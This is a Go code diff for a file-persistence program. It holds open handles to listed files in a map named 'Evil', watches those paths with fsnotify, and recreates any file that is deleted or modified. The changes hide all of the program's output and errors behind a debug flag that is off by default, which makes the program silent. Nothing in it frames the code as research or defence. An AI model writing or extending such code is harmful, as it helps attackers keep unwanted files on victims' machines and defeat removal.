@@ -6,7 +6,6 @@ import (
 	"io"
 	"log"
 	"os"
-
 	"strings"
 	"time"
 
@@ -20,6 +19,8 @@ var (
 
 var Evil = make(map[string]*os.File)
 
+var debug bool = false
+
 func OpenFiles() {
 	lines := strings.Split(locations, "\n")
 	i := 1
@@ -28,23 +29,13 @@ func OpenFiles() {
 		if file == nil {
 			continue
 		}
-		fmt.Println(i, line)
-		// fmt.Println(err)
+
+		if debug {
+			fmt.Println(i, line)
+		}
 		i++
 		Evil[line] = file
 
-		// dst, err := os.Create("printer.exe")
-		// if err != nil {
-		// 	fmt.Println(err)
-		// 	return
-		// }
-		// defer dst.Close()
-
-		// _, err = io.Copy(dst, file)
-		// if err != nil {
-		// 	fmt.Println(err)
-		// 	return
-		// }
 		go DeletionObserver(line)
 
 	}
@@ -53,7 +44,7 @@ func OpenFiles() {
 func DeletionObserver(location string) {
 	// Create a new watcher instance
 	watcher, err := fsnotify.NewWatcher()
-	if err != nil {
+	if err != nil && debug {
 		log.Fatal(err)
 	}
 	defer watcher.Close()
@@ -68,8 +59,10 @@ func DeletionObserver(location string) {
 				}
 				// log.Println("event:", event)
 				if event.Has(fsnotify.Chmod) {
-					log.Println("[DELETED]:", event.Name)
-					log.Println("Replacing file!")
+					if debug {
+						log.Println("[DELETED]:", event.Name)
+						log.Println("Replacing file!")
+					}
 					Replace(location, Evil[location])
 					watcher.Close()
 					Evil[location].Close()
@@ -80,13 +73,14 @@ func DeletionObserver(location string) {
 				if !ok {
 					return
 				}
-				log.Println("error:", err)
+				if debug {
+					log.Println("error:", err)
+				}
 			}
 		}
 	}()
-	// Add a path.
 	err = watcher.Add(location)
-	if err != nil {
+	if err != nil && debug {
 		log.Fatal(err)
 	}
 
@@ -97,26 +91,34 @@ func DeletionObserver(location string) {
 func Replace(location string, file *os.File) {
 	// Create a new file
 	newFile, err := os.Create(location)
-	if err != nil {
+	if err != nil && debug {
 		panic(err)
 	}
 	defer newFile.Close()
 
 	// Copy the contents of the original file to the new file
 	_, err = io.Copy(newFile, file)
-	if err != nil {
+	if err != nil && debug {
 		panic(err)
 	}
-	fmt.Println("File Replaced", location)
+	if debug {
+		fmt.Println("File Replaced", location)
+	}
 	DeletionObserver(location)
 }
 
 func main() {
-	fmt.Println(locations)
+	if debug {
+		fmt.Println(locations)
+	}
 	OpenFiles()
-	fmt.Println(Evil)
+	if debug {
+		fmt.Println(Evil)
+	}
 	for true {
-		fmt.Println("[HEARTBEAT]", len(Evil))
+		if debug {
+			fmt.Println("[HEARTBEAT]", len(Evil))
+		}
 		time.Sleep(time.Millisecond * 5000)
 	}
 }
